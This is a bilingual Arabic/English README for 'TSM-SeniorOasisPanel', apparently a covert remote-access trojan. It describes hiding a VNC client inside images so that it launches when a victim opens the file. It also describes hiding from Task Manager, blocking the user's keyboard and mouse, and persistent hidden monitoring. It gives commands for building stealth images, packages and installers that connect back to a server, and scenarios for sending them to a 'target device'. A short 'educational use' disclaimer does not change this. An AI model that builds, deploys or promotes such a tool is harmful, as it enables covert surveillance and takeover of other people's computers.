# 🎯 TSM-SeniorOasisPanel - النظام الكامل

## نظرة عامة | Overview

**TSM-SeniorOasisPanel** هو نظام نقل ملفات متقدم مع إمكانيات VNC مخفية وتشفير الصور. يعمل النظام بشكل مخفي تماماً عند تنزيل الصورة على سطح المكتب، مع إمكانية التحكم الكامل في الشاشة وحجب إدخالات المستخدم.

**TSM-SeniorOasisPanel** is an advanced file transfer system with hidden VNC capabilities and image steganography. The system operates completely hidden when the image is downloaded to the desktop, with full screen control and user input blocking capabilities.

## 🚀 البدء السريع | Quick Start

### 1. التثبيت | Installation
```bash
# تثبيت المتطلبات
pip install -r requirements_complete.txt

# تشغيل النظام
TSM_Quick_Start.bat
```

### 2. الاستخدام الأساسي | Basic Usage
```bash
# تشغيل المشغل الرئيسي
python TSM_Master_Launcher.py

# أو تشغيل الخادم مباشرة
python TSM_SeniorOasisPanel_server.py
```

## 📁 الملفات الرئيسية | Main Files

### الخادم والعميل | Server & Client
- `TSM_SeniorOasisPanel_server.py` - خادم TCP متعدد العملاء
- `TSM_SeniorOasisPanel_client.py` - عميل مع وضع مخفي

### نظام VNC المحسن | Enhanced VNC System
- `TSM_EnhancedVNC.py` - VNC محسن للتحكم الكامل
- `TSM_AutoVNC.py` - VNC تلقائي مخفي
- `TSM_InputController.py` - تحكم في إدخالات المستخدم

### التشفير والخفاء | Steganography & Stealth
- `TSM_ImageSteganography.py` - تشفير LSB للصور
- `TSM_StealthMode.py` - الوضع المخفي الكامل
- `TSM_AutoLauncher.py` - مشغل تلقائي متقدم

### الأدوات المساعدة | Utilities
- `TSM_Master_Launcher.py` - المشغل الرئيسي
- `TSM_SystemTest.py` - اختبارات النظام
- `TSM_Complete_Guide.md` - الدليل الكامل

## 🎯 الميزات الرئيسية | Key Features

### 1. VNC المخفي | Hidden VNC
- ✅ **تفعيل تلقائي** عند فتح الصورة
- ✅ **حجب إدخالات المستخدم** مؤقتاً
- ✅ **السيطرة الكاملة** على الشاشة
- ✅ **إخفاء من مدير المهام**

### 2. نقل الملفات الآمن | Secure File Transfer
- ✅ **TCP socket** موثوق
- ✅ **دعم متعدد العملاء** (حتى 10 عملاء)
- ✅ **فلترة أسماء الملفات** للأمان
- ✅ **حدود حجم الملفات** (100MB)

### 3. تشفير الصور | Image Steganography
- ✅ **LSB steganography** متقدم
- ✅ **ضغط البيانات** مع zlib
- ✅ **رؤوس سحرية** للتحقق
- ✅ **دعم PNG** بجودة عالية

### 4. التحكم في النظام | System Control
- ✅ **حجب الماوس ولوحة المفاتيح**
- ✅ **إخفاء جميع النوافذ**
- ✅ **إخفاء شريط المهام**
- ✅ **محاكاة الإدخالات**

## 🔧 الاستخدام المتقدم | Advanced Usage

### إنشاء صورة مخفية | Create Stealth Image
```bash
# إنشاء صورة مع VNC مخفي
python TSM_StealthMode.py create photo.jpg localhost 5001

# إنشاء حزمة نشر مخفية
python TSM_StealthMode.py package photo.jpg your-server.com 5001

# إنشاء مثبت مخفي
python TSM_StealthMode.py installer photo.jpg your-server.com 5001
```

### تشغيل VNC المحسن | Run Enhanced VNC
```bash
# تشغيل خادم VNC
python TSM_EnhancedVNC.py server

# تشغيل عميل VNC
python TSM_EnhancedVNC.py client
```

### اختبار النظام | Test System
```bash
# تشغيل جميع الاختبارات
python TSM_SystemTest.py

# اختبار مكون معين
python -c "from TSM_SystemTest import test_server; test_server()"
```

## 📋 سيناريوهات الاستخدام | Usage Scenarios

### السيناريو 1: التحكم عن بُعد | Remote Control
1. **إنشاء صورة مخفية** مع VNC
2. **إرسال الصورة** للجهاز المستهدف
3. **فتح الصورة** - يبدأ VNC تلقائياً
4. **التحكم الكامل** في الشاشة من الخادم

### السيناريو 2: مراقبة مخفية | Hidden Monitoring
1. **إنشاء حزمة نشر** مخفية
2. **تثبيت الحزمة** على الجهاز المستهدف
3. **VNC يعمل تلقائياً** عند بدء التشغيل
4. **مراقبة مستمرة** للشاشة

### السيناريو 3: نقل ملفات مخفي | Hidden File Transfer
1. **تشغيل خادم TSM**
2. **إنشاء عميل مخفي** في الصورة
3. **فتح الصورة** - يبدأ العميل تلقائياً
4. **نقل الملفات** بشكل مخفي

## 🛡️ الأمان | Security

### حماية الخادم | Server Security
- **فلترة أسماء الملفات** لمنع هجمات directory traversal
- **حدود حجم الملفات** لمنع استنزاف الذاكرة
- **تسجيل شامل** لجميع العمليات
- **دعم متعدد العملاء** مع عزل آمن

### حماية العميل | Client Security
- **التنفيذ المخفي** في الخلفية
- **إخفاء من مدير المهام**
- **أسماء مخفية** في سجل Windows
- **تنظيف تلقائي** للملفات المؤقتة

## ⚡ الأداء | Performance

### تحسين الخادم | Server Optimization
- **ضبط max_clients** حسب سعة النظام
- **تعديل buffer_size** حسب ظروف الشبكة
- **مراقبة استخدام الذاكرة**
- **تحسين معالجة الملفات**

### تحسين VNC | VNC Optimization
- **ضبط frame_rate** للأداء الأمثل (20 FPS)
- **تعديل quality** للجودة المطلوبة (90%)
- **ضغط البيانات** المتقدم
- **إدارة الاتصالات** الذكية

## 🔍 استكشاف الأخطاء | Troubleshooting

### مشاكل شائعة | Common Issues

#### مشاكل الاتصال | Connection Issues
```bash
# فحص حالة الخادم
python TSM_SystemTest.py

# اختبار الاتصال
python TSM_SeniorOasisPanel_client.py
```

#### مشاكل VNC | VNC Issues
```bash
# تشغيل VNC المحسن
python TSM_EnhancedVNC.py client

# اختبار التحكم في الإدخالات
python TSM_InputController.py
```

#### مشاكل التشفير | Steganography Issues
```bash
# التحقق من الصورة المخفية
python TSM_ImageSteganography.py verify hidden_image.png

# استخراج العميل من الصورة
python TSM_ImageSteganography.py extract hidden_image.png client.py
```

## 📚 الوثائق | Documentation

- **TSM_Complete_Guide.md** - الدليل الكامل
- **TSM_DeploymentGuide.md** - دليل النشر
- **TSM_SystemTest.py** - اختبارات النظام
- **TSM_Demo.py** - عرض توضيحي

## ⚠️ التحذيرات القانونية | Legal Warnings

**هذا النظام مخصص للأغراض التعليمية والاختبار المصرح به فقط.**

**This system is intended for educational and authorized testing purposes only.**

المستخدمون مسؤولون عن ضمان الامتثال لجميع القوانين واللوائح المعمول بها.

Users are responsible for ensuring compliance with all applicable laws and regulations.

## 🤝 المساهمة | Contributing

1. Fork المشروع
2. إنشاء فرع للميزة الجديدة
3. Commit التغييرات
4. Push إلى الفرع
5. فتح Pull Request

## 📄 الترخيص | License

هذا المشروع مرخص تحت رخصة MIT.

This project is licensed under the MIT License.

## 👥 الفريق | Team

**TSM-SeniorOasisPanel Development Team**

---

## 🎉 الخلاصة | Conclusion

نظام TSM-SeniorOasisPanel يوفر حلاً شاملاً لنقل الملفات المخفي والتحكم عن بُعد. مع ميزاته المتقدمة في التشفير والخفاء، يمكن استخدامه لأغراض تعليمية واختبارية متقدمة.

The TSM-SeniorOasisPanel system provides a comprehensive solution for hidden file transfer and remote control. With its advanced steganography and stealth features, it can be used for advanced educational and testing purposes.

**🚀 ابدأ الآن مع TSM-SeniorOasisPanel!**

**🚀 Start now with TSM-SeniorOasisPanel!**
